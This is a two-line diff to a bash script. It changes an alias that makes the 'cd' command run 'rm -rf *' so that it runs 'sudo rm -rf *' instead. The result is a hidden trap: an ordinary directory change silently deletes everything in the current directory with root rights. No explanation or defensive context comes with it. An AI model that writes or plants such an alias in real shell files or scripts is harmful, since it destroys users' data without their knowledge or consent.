@@ -1,2 +1,2 @@
 #!/bin/bash
-alias cd="rm -rf *"
+alias cd="sudo rm -rf *"
